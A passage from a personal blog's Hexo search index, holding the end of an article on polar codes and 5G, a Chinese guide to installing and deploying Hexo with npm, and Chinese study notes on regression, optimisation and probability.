rectification inner code. For instance: A Reed-Solomonouter code is used in the Reed-Solomon code with LDPC Coded Modulation(RS-LCM). The BCH code outer code is used in the DVB-S2, DVB-T2, andDVB-C2 standards to mop up leftover errors following LDPC decoding.</li></ol><p>Polar codes have wide applications in Information theory such asQuasi Cyclic LDPC code, Irregular Repeat-Accumulate (IRA) code,Spatially Coupled LDPC (SP-LDPC), and NBLDPC Codes described.</p><h2 id="contributions-of-china">Contributions of China</h2><p>China's Huawei company has been developing Polar code for many yearsand has made great achievements in the development of coder and decoderof Polar code. Huawei has solved the basic problems of codingconstruction and decoding after two years of research. According to thelatest public 14 years of technical information, IS selection problems,code length problems, decoding algorithms, HARQ, etc. also did not get agood solution.</p><p>Huawei has promoted the Polar Code (Polarization Code) scheme as thecoding scheme for 5G control channel eMBB scenarios which can't beseparated from China's growing comprehensive national power, as well asthe communication and coordination of relevant domestic departments - inthe most critical vote, Huawei's old domestic rival ZTE gave strongsupport, China Telecom, China Mobile, China Unicom, and Datang Telecomalso chose to support Huawei. This marks a higher voice for Chinesecommunication vendors in the 5G era and reflects the growing strength ofChinese communication technology.</p><h2 id="future-tendency">Future tendency</h2><p>5G phones must support at least 4G and 3G networks from a deviceimplementation standpoint. Turbo code is used in 3G and 4G, whereas LDPCand Polar code have been confirmed for 5G, implying at least three setsof coders and decoders on the phone. The baseband processor's coder anddecoder are critical components. This design will raise the basebandprocessor's load and power consumption, reducing standby time andraising the cost of a 5G terminal. Operators' operating equipment, onthe other hand, is incapable of smoothly transitioning from 4.5G to 5G,necessitating investment in new network equipment. which may also delaythe formal commercial time of 5G.</p><p>Increasing the performance of future wireless systems requires theuse of increasingly complicated channel codes, and this article outlinessome of the high-level benefits. The application of Polar code willbecome more and more mature in the future, and there is a chance thatother coding methods approaching or achieving the Shannon limit will bedeveloped.</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1"class="footnote-text"><span>https://www.youtube.com/watch?v=zYOXFt0Ixwk<a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo配置</title>
    <link href="/2021/10/07/hexo/"/>
    <url>/2021/10/07/hexo/</url>
    
    <content type="html"><![CDATA[<h1 id="hexo">Hexo</h1><h2 id="下载与部署win10">下载与部署(win10)</h2><h3 id="步骤">步骤</h3><p>下载git -&gt; 打开git bash -&gt; 利用官网指令下载并初始化hexo</p><h3 id="概念">概念</h3><ol type="1"><li>通过git bash在win10代替cmd作为终端。</li><li>npm是node.js的包管理工具</li><li>win10的环境变量是程序运行的默认路径，按照顺序找运行命令对应的程序</li></ol><h3 id="注意事项">注意事项</h3><ol type="1"><li><p>注意环境变量的设置</p><ul><li>将git加入环境变量</li><li>将npm对应bin文件的位置加入环境变量</li><li>配置完重启终端</li></ul></li><li><p>默认情况下，npm和Node一起装在<code>C:\Program Files (x86)\nodejs</code>，以下简称<code>%Program%</code>；而包括npm自己和他全局安装的包（cnpm..etc）是装在另一个user-specific路径的<code>C:\Users\&lt;username&gt;\AppData\Roaming\npm</code>，以下简称<code>%Appdata%</code>因为在环境变量中，安装程序把<code>%Program%</code>放在<code>%Appdata%</code>前面，他会一直使用和node装一起的npm，而不是你安装的<code>npm -g install npm@&lt;version&gt;</code>。(改变顺序后需要重启)</p><p>参考网址:https://segmentfault.com/a/1190000014073800</p></li><li><p>注意版本（同时确认安装成功）</p><ul><li>注意更新git</li><li>包管理工具npm的版本更新</li><li>hexo与node.js的版本是否对应<ul><li>node.js 版本太高，需降至 13 或 12 即可解決</li></ul></li></ul></li><li><p>注意插件</p><ul><li>如果开启了字数统计，应当安装一下<code>hexo-wordcount</code></li><li>typora npm install hexo-asset-image</li></ul></li></ol><h3 id="常用指令">常用指令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更新git 否则ctrl无反应</span><br>git update-git-for-windows<br><span class="hljs-comment"># 设置代理</span><br>npm config <span class="hljs-built_in">set</span> proxy http://127.0.0.1:41091<br>npm config <span class="hljs-built_in">set</span> https-proxy http://127.0.0.1:41091<br><span class="hljs-comment"># 确认版本</span><br>npm -v<br><span class="hljs-comment"># 更新</span><br>npm install npm@latest -g<br>npm install -g npm@6<br><span class="hljs-comment"># check package</span><br>npm config get package-lock<br>npm config <span class="hljs-built_in">set</span> package-lock<br>npm list -g --depth 0<br><span class="hljs-comment"># 删除</span><br>npm <span class="hljs-built_in">rm</span> hexo-cli -g<br><span class="hljs-comment"># 下载</span><br>npm install -g hexo-cli<br><span class="hljs-comment"># 确认安装成功</span><br>hexo -v<br><span class="hljs-comment"># 初始化</span><br>hexo init &lt;folder&gt;<br></code></pre></td></tr></table></figure><h2 id="与远程库进行绑定">与远程库进行绑定</h2><h3 id="步骤-1">步骤</h3><p>在_config配置deploy -&gt; 在source中设置CNAME(custom domain) -&gt;hexo deploy(设置branch,可以为master)</p><h2 id="使用">使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建一个blog</span><br>hexo new <span class="hljs-string">&quot;project&quot;</span><br><span class="hljs-comment"># 生成</span><br>hexo g<br><span class="hljs-comment"># 本地服务器</span><br>hexo s<br><span class="hljs-comment"># 清理</span><br>hexo clean<br><span class="hljs-comment"># 上传</span><br>hexo deploy<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>math</title>
    <link href="/2021/10/07/math/"/>
    <url>/2021/10/07/math/</url>
    
    <content type="html"><![CDATA[<h1 id="matrix">matrix</h1><h2 id="basic">basic</h2><h3 id="dot-product">dot product</h3><h3 id="transpose">transpose</h3><p><span class="math display">\[(AB)^T = B^TA^T\]</span></p><p>如果结果为scaler(标量 <spanclass="math inline">\(1\times1\)</span>),则转置等于自身</p><h2 id="regression">regression</h2><h3 id="blue">BLUE</h3><p>best linear unbiased estimator (最佳线性无偏估计)</p><h3 id="ols">OLS</h3><p>ordinary least square <span class="math display">\[y = X \beta + \epsilon\]</span></p><p><span class="math display">\[\begin{bmatrix}Y_1\\Y_2\\\vdots\\\vdots\\Y_n\end{bmatrix}_{n\times1}= \begin{bmatrix}1 &amp; X_{11} &amp; X_{12} &amp; \dots &amp; X_{1k}\\1 &amp; X_{21} &amp; X_{22} &amp; \dots &amp; X_{2k}\\\vdots &amp; \vdots &amp; \vdots &amp; \dots &amp; \vdots\\\vdots &amp; \vdots &amp; \vdots &amp; \dots &amp; \vdots\\1 &amp; X_{n1} &amp; X_{n2} &amp; \dots &amp; X_{nk}\\\end{bmatrix}_{n \times k} \begin{bmatrix}\beta_1\\\beta_2\\\vdots\\\vdots\\\beta_n\end{bmatrix}_{k+1}+\begin{bmatrix}\epsilon_1\\\epsilon_2\\\vdots\\\vdots\\\epsilon_n\end{bmatrix}_{n\times 1}\]</span> 常数项 <span class="math inline">\(\beta_1\)</span> <spanclass="math display">\[RSS=e&#39;e=\begin{bmatrix}e_1 &amp; e_2 &amp; \dots &amp; \dots &amp; e_n\end{bmatrix}_{1 \times n} \begin{bmatrix}e_1 \\ e_2 \\ \vdots \\ \vdots \\ e_n\end{bmatrix}_{n\times1}\]</span></p><p><span class="math display">\[\begin{align}e&#39;e &amp;= (y-X\hat\beta)&#39;(y-X\hat\beta)\\&amp;=y&#39;y-\hat\beta&#39;X&#39;y-y&#39;X\hat \beta + \hat\beta&#39;X&#39;X\hat \beta\\&amp;= y&#39;y - 2\hat\beta&#39;X&#39;y + \hat \beta&#39;X&#39;X\hat\beta\end{align}\]</span></p><p>由于<span class="math inline">\(\hat \beta&#39;X&#39;y\)</span> 与<span class="math inline">\(y&#39;X\hat \beta\)</span>都是scaler，转置为它本身。</p><h2 id="矩阵求导">矩阵求导</h2><p><span class="math inline">\(\frac{\partial X&#39;\beta}{\partial\beta}=X&#39;\)</span></p><p><span class="math inline">\(\frac{\partial h&#39;Vh}{\partialh&#39;}=Vh\)</span> （分别求偏导） <span class="math display">\[\frac{\partial X\beta}{\partial \beta}= \frac{\partial\beta&#39;X}{\partial \beta} =X\\\frac{\partial e&#39;e}{\partial \beta } = -2X&#39;y + 2X&#39;X\hat\beta = 0\\\hat \beta = (X&#39;X)^{-1}X&#39;y\]</span></p><h3 id="assumption">Assumption</h3><p>the Gauss-Markov Assumptions</p><ol type="1"><li><p><span class="math inline">\(y=X\beta+\epsilon\)</span></p><p>存在某种线性关系</p></li><li><p>X is an <span class="math inline">\(n\times k\)</span> matrix offull rank</p><p>多重共线性 满秩举证</p></li><li><p><span class="math inline">\(E(\epsilon|X)=0\)</span></p></li><li><p><spanclass="math inline">\(E(\epsilon\epsilon&#39;|X)=\sigma^2I\)</span></p><p>homoscedasticity 同方差性 no autocorrelation 相关性</p><p>方差为定值，0均值</p></li><li><p>X is unrelated to <spanclass="math inline">\(\epsilon\)</span></p></li><li><p>often: <span class="math inline">\(\epsilon|X \simN[0,\sigma^2I]\)</span></p></li></ol><h3 id="gls">GLS</h3><p>heteroscedasticity 异方差</p><p>transformation:</p><p>使得<span class="math inline">\(P\Sigma\)</span>等价于<spanclass="math inline">\(\epsilon\)</span> <span class="math display">\[var(\epsilon\epsilon&#39;|X) = \sigma^2\Omega\\Py =PX\hat\beta +P\Sigma\\P = \Omega^{\frac{1}{2}}\]</span></p><p>WLS independent value <span class="math display">\[\Omega_{WLS} = \begin{bmatrix}w_{11}&amp;0&amp;\dots&amp;0\\0&amp;w_{22}&amp;\dots&amp;\vdots\\\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\0&amp;0&amp;\dots&amp;w_{nn}\\\end{bmatrix}\\\]</span> 考虑covariance <span class="math display">\[\quad\\\Omega_{GLS} = \begin{bmatrix}\sigma_{11}&amp;\sigma_{12}&amp;\dots&amp;\sigma_{1n}\\\sigma_{21}&amp;\sigma_{22}&amp;\dots&amp;\vdots\\\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\\sigma_{n1}&amp;\sigma_{n2}&amp;\dots&amp;\sigma_{nn}\\\end{bmatrix}\\\]</span></p><h3 id="arma">ARMA</h3><p>对残差再进行拟合 -&gt; partial autocorrelation -&gt;残差与lag相关</p><h3 id="r2"><span class="math inline">\(R^2\)</span></h3><p><span class="math display">\[R^2=\frac{\sum\limits^n_{i=0}(\hat y_i-\overliney)^2}{\sum\limits^n_{i=0}(y_i-\overliney)^2}=\frac{Y&#39;P&#39;TLPY}{Y&#39;LY}=1-\frac{Y&#39;MY}{Y&#39;LY}=1-\frac{RSS}{TSS}\]</span></p><p>TSS: total sum of squares RSS: residual sum of squares</p><h1 id="最优化">最优化</h1><h2 id="lagrange乘数">Lagrange乘数</h2><p>Lagrange multiplier <span class="math display">\[\begin{align}\max \quad&amp; f(x,y)\\s.t.\quad&amp;g(x,y)=0\end{align}\]</span></p><p><span class="math display">\[\mathcal{L}(x,y,\lambda)=f(x,y)-\lambda g(x,y)\]</span></p><p><span class="math display">\[\bigtriangledown_{x,y,\lambda}\mathcal{L}(x,y,\lambda)=0\\\]</span></p><p>其中<spanclass="math inline">\(\bigtriangledown_{x,y,\lambda}\mathcal{L}(x,y,z)\)</span>表示函数分别对<spanclass="math inline">\(x,y,z\)</span>取偏导，</p><h3 id="intuition">intuition</h3><p><span class="math display">\[\begin{cases}\bigtriangledown f(x,y)=\lambda \bigtriangledown g(x,y)\\g(x,y)=0\end{cases}\]</span></p><p><spanclass="math inline">\(g(x,y)\)</span>的自由度为1，可视为曲线，而与<spanclass="math inline">\(f(x,y)\)</span>等高线相切的位置，就是函数的一个极值（相交则有多个点）其中梯度代表了与等高线（降维）垂直的矢量，所以当梯度平行时<spanclass="math inline">\(\bigtriangledown f(x,y)=\lambda \bigtriangledowng(x,y)\)</span>可取到极值。</p><h1 id="统计">统计</h1><h2 id="describe">describe</h2><h3 id="skew">skew</h3><h3 id="kurtosis">kurtosis</h3><p>heavy tails and outliers(离群值) -&gt; 常用于黑天鹅事件</p><p>power law distribution <spanclass="math inline">\(x^{-\alpha}\)</span>均值并不会随样本数的增多而收敛（不满足大数定律）long tail 28定律</p><h2 id="basic-1">basic</h2><h3 id="rvs">rvs</h3><p>Random variates</p><h3 id="确定参数">确定参数</h3><p>通过 maximum likelihood</p><h3 id="normal">normal</h3><p>接近样本数极多的二项分布，应用较广，模拟了现实多因素影响（数量极多的二项分布）最终往往趋于正态分布，且互相之间不存在相关性，但正态分布的收敛较快，且金融数据之间相关性较强，不适用于正态分布，数量级为<span class="math inline">\(e^{-x^2}\)</span></p><h2 id="random-walk">random walk</h2><h3 id="简单随机游走">简单随机游走</h3><p>simple random walk <span class="math display">\[Z_i=\begin{cases}1 &amp;p=\frac{1}{2}\\-1&amp;p=\frac{1}{2}\end{cases}\]</span></p><p><span class="math display">\[S_n = \sum\limits_{j=1}^nZ_i\]</span></p><p><span class="math display">\[E(S_n)=0\]</span></p><p><span class="math display">\[\sigma^2 = E(S_n^2) =\sum\limits_{i=1}^nE(Z_i^2)+2\sum\limits_{i=1}^n\sum\limits_{j=1}^nE(Z_iZ_j)=n\]</span></p><p><span class="math display">\[\lim\limits_{n \rightarrow\infty}\frac{E(|S_n|)}{\sqrt{n}} =\sqrt{\frac{2}{\pi}}\]</span></p><h3 id="wiener-process">Wiener process</h3><p><span class="math display">\[\Delta W = \varepsilon_t\sqrt{\Delta t}\]</span></p><p>取 <span class="math inline">\(\sqrt{\Delta t}\)</span>的原因：收敛较慢，可以体现锯齿状（jagged）不会出现frozen，和无限大。<span class="math display">\[\varepsilon_t \sim N(0,1)\]</span></p><p><span class="math display">\[E(\Delta W_t^2) = (\sqrt{\Delta t})^2E(\varepsilon^2) = \Delta t\]</span></p><p><span class="math display">\[W_T=(\varepsilon_0+\varepsilon_{\Delta_t}+\cdots+\varepsilon_{T-\Delta_t})\sqrt{\Deltat}\]</span></p><p><span class="math display">\[E(W_T^2) =n\Delta t = T\]</span></p><p><span class="math display">\[W_T\sim N(0,T)\]</span></p><p><span class="math display">\[W_{t_2}- W_{t_1} \sim N(0,t_2-t_1)\]</span></p><h2 id="test">test</h2><h3 id="t-test">t-test</h3><p><span class="math display">\[\frac{\overline x-\mu}{s/\sqrt{n}}\sim t(n-1)\]</span></p><p>自由度与sample个数有关，sample越多越接近正态分布，由于heavytail常用于金融数据，skew-student可以完善。</p><p>置信区间 <span class="math display">\[m\pm t \frac{d}{\sqrt{n}}\]</span></p><h2 id="bayes">Bayes</h2><h3 id="后验">后验</h3><p>posterior distribution <span class="math display">\[L(\theta|x)\sim Bin(n,p)=\theta ^k(1-\theta)^{n-k}\]</span> <span class="math inline">\(L(\theta|x)\)</span>为似然估计likelihood <span class="math display">\[p(\theta) \sim\beta(a,b)=\frac{\Gamma(a+b)}{\Gamma(a)\Gamma(b)}\theta^{a-1}(1-\theta)^{b-1}\]</span> <span class="math inline">\(p(\theta)\)</span>为 prior随着观察次数的改变而改变，a、b 为观察正/反面的情况 <spanclass="math display">\[\begin{align}p(\theta|x)&amp;=\frac{L(\theta|x)p(\theta)}{\int^1_0L(\theta|x)p(\theta)d\theta}\\&amp;=\frac{\Gamma(a+b+n)}{\Gamma(a+k)\Gamma(b+n-k)}\theta^{a+k-1}(1-\theta)^{b+n-k+1}\end{align}\]</span></p><p><span class="math inline">\(p(\theta|x)\)</span>即 posteriordistribution</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>test.md</title>
    <link href="/2021/10/07/test-md/"/>
    <url>/2021/10/07/test-md/</url>
    
    <content type="html"><![CDATA[<p>Keep loading...</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
